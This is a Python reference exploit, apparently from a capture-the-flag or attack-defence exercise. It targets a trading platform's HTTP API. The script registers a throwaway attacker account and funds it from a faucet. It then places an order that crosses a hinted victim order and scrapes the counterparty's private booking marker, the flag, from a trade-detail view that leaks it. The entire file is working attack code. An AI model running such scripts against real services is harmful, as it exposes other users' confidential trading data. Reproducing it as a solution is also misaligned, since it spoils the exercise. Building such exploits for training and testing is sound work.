#!/usr/bin/env python3
"""Reference exploit for EX-3 counterparty booking projection sampleage.

The exploit uses ordinary public HTTP APIs only. It registers an attacker,
places a crossing order to become a participant in execution against the hinted
resting order, reads the vulnerable participant trade detail view, and prints
only the recovered flag.
"""

from __future__ import annotations

import json
import secrets
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from decimal import Decimal, InvalidOperation
from typing import Any, Mapping


TIMEOUT = 5
ATTACKER_NOTE = "ex3-counterparty"


class ExploitError(Exception):
    pass


def main(argv: list[str]) -> int:
    if len(argv) != 3:
        print("usage: ex_counterparty_receipt.py <host> <attack-data-json>", file=sys.stderr)
        return 2

    try:
        host = normalize_base_url(argv[1])
        attack_data = parse_attack_data(argv[2])
        token = register_attacker(host)
        trade_id = create_counterparty_trade(host, token, attack_data)
        detail = get_trade_detail(host, token, trade_id)
        flag = extract_booking_marker(detail)
        if flag == ATTACKER_NOTE:
            raise ExploitError("execution detail did not contain target marker")
    except ExploitError as error:
        print(str(error), file=sys.stderr)
        return 1

    print(flag)
    return 0


def parse_attack_data(raw: str) -> Mapping[str, Any]:
    try:
        data = json.loads(raw)
    except json.JSONDecodeError as error:
        raise ExploitError("invalid attack data") from error
    if not isinstance(data, Mapping):
        raise ExploitError("attack data must be an object")
    if isinstance(data.get("public"), Mapping):
        data = data["public"]
    if data.get("place") not in (2, "2"):
        raise ExploitError("attack data is not for place 2")
    return data


def register_attacker(host: str) -> str:
    nonce = secrets.token_hex(8)
    response = request_json(
        host,
        "POST",
        "/api/auth/register",
        payload={
            "username": f"ex3-attacker-{nonce}",
            "password": f"Vx-{secrets.token_urlsafe(18)}",
            "account_profile": "spot",
        },
    )
    token = response.get("session", {}).get("token") if isinstance(response.get("session"), Mapping) else None
    if not isinstance(token, str) or not token:
        raise ExploitError("attacker registration failed")
    faucet(host, token, f"ex3-faucet-{nonce}")
    return token


def faucet(host: str, token: str, idempotency_key: str) -> None:
    request_json(
        host,
        "POST",
        "/api/faucet",
        payload={"idempotency_key": idempotency_key},
        token=token,
    )


def create_counterparty_trade(host: str, token: str, attack_data: Mapping[str, Any]) -> Any:
    market_symbol = required_string(attack_data, "market", fallback_key="market_symbol")
    victim_side = required_string(attack_data, "side_hint", fallback_key="side")
    side = opposite_side(victim_side)
    price = price_from_attack_data(attack_data, victim_side)
    quantity = required_string(attack_data, "quantity")
    before_ids = user_trade_ids(host, token)
    order_ref = f"ex3-{secrets.token_hex(6)}"

    request_json(
        host,
        "POST",
        "/api/orders",
        payload={
            "market_symbol": market_symbol,
            "side": side,
            "order_type": "limit",
            "limit_price": price,
            "quantity": quantity,
            "order_ref": order_ref,
            "reference_code": order_ref,
            "client_order_id": order_ref,
            "execution_memo": ATTACKER_NOTE,
        },
        token=token,
    )

    for _attempt in range(24):
        fresh_trades = [trade for trade in user_trades(host, token) if trade.get("id") not in before_ids]
        for trade in fresh_trades:
            trade_id = trade.get("id")
            if trade_matches_hint(trade, price, quantity):
                return trade_id
        if len(fresh_trades) == 1 and fresh_trades[0].get("id") is not None:
            return fresh_trades[0].get("id")
        time.sleep(0.25)
    raise ExploitError("counterparty trade not found")


def user_trade_ids(host: str, token: str) -> set[Any]:
    return {trade.get("id") for trade in user_trades(host, token)}


def user_trades(host: str, token: str) -> list[Mapping[str, Any]]:
    response = request_json(host, "GET", "/api/users/me/trades", token=token)
    trades = response.get("trades")
    if not isinstance(trades, list):
        raise ExploitError("user trades response missing")
    return [trade for trade in trades if isinstance(trade, Mapping)]


def trade_matches_hint(trade: Mapping[str, Any], price: str, quantity: str) -> bool:
    return decimal_equal(trade.get("price"), price) and decimal_equal(trade.get("quantity"), quantity)


def get_trade_detail(host: str, token: str, trade_id: Any) -> Mapping[str, Any]:
    encoded = urllib.parse.quote(str(trade_id), safe="")
    response = request_json(host, "GET", f"/api/trades/{encoded}", token=token)
    trade = response.get("trade")
    if not isinstance(trade, Mapping):
        raise ExploitError("trade detail response missing")
    return trade


def request_json(
    host: str,
    method: str,
    path: str,
    *,
    payload: Mapping[str, Any] | None = None,
    token: str | None = None,
) -> Mapping[str, Any]:
    body = None
    headers = {"Accept": "application/json"}
    if payload is not None:
        body = json.dumps(payload, sort_keys=True, separators=(",", ":")).encode("utf-8")
        headers["Content-Type"] = "application/json"
    if token:
        headers["Authorization"] = f"Bearer {token}"

    last_error: Exception | None = None
    for _attempt in range(3):
        request = urllib.request.Request(host + path, data=body, headers=headers, method=method)
        try:
            with urllib.request.urlopen(request, timeout=TIMEOUT) as response:
                raw = response.read()
                break
        except urllib.error.HTTPError as error:
            if error.code < 500:
                raise ExploitError(f"unexpected HTTP status {error.code}") from error
            last_error = error
        except OSError as error:
            last_error = error
    else:
        raise ExploitError("service unavailable") from last_error

    try:
        data = json.loads(raw.decode("utf-8"))
    except (UnicodeDecodeError, json.JSONDecodeError) as error:
        raise ExploitError("invalid JSON response") from error
    if not isinstance(data, Mapping):
        raise ExploitError("JSON response must be an object")
    return data


def required_string(data: Mapping[str, Any], key: str, *, fallback_key: str | None = None) -> str:
    value = data.get(key)
    if (not isinstance(value, str) or not value) and fallback_key:
        value = data.get(fallback_key)
    if not isinstance(value, str) or not value:
        raise ExploitError(f"{key} missing")
    return value


def price_from_attack_data(data: Mapping[str, Any], victim_side: str) -> str:
    bucket = data.get("price_bucket")
    if isinstance(bucket, str) and "-" in bucket:
        lower, upper = bucket.split("-", 1)
        lower = lower.strip()
        upper = upper.strip()
        selected = upper if victim_side == "sell" else lower
        if selected:
            return selected
    return required_string(data, "price", fallback_key="limit_price")


def extract_booking_marker(detail: Mapping[str, Any]) -> str:
    for section in ("venue_allocation", "execution_notice", "allocation_context"):
        value = detail.get(section)
        marker = booking_marker_from(value)
        if marker:
            return marker
    marker = booking_marker_from(detail)
    if marker:
        return marker
    raise ExploitError("booking marker missing")


def booking_marker_from(value: Any) -> str | None:
    if isinstance(value, Mapping):
        for key in ("desk_ref", "booking_marker", "source_marker", "booking_ref"):
            candidate = value.get(key)
            if isinstance(candidate, str) and candidate:
                return candidate
        for child in value.values():
            found = booking_marker_from(child)
            if found:
                return found
    elif isinstance(value, list):
        for child in value:
            found = booking_marker_from(child)
            if found:
                return found
    return None


def opposite_side(side: str) -> str:
    if side == "buy":
        return "sell"
    if side == "sell":
        return "buy"
    raise ExploitError("side is invalid")


def format_hint(value: str) -> str:
    if "." not in value:
        return f"{value}.00000000"
    whole, fractional = value.split(".", 1)
    return f"{whole}.{fractional[:8].ljust(8, '0')}"


def decimal_equal(left: Any, right: Any) -> bool:
    try:
        return Decimal(str(left)) == Decimal(str(right))
    except (InvalidOperation, TypeError, ValueError):
        return False


def normalize_base_url(host: str) -> str:
    if not host:
        raise ExploitError("host is required")
    host = host.strip()
    if not host.startswith(("http://", "https://")):
        host = "http://" + host
    return host.rstrip("/")


if __name__ == "__main__":
    raise SystemExit(main(sys.argv))
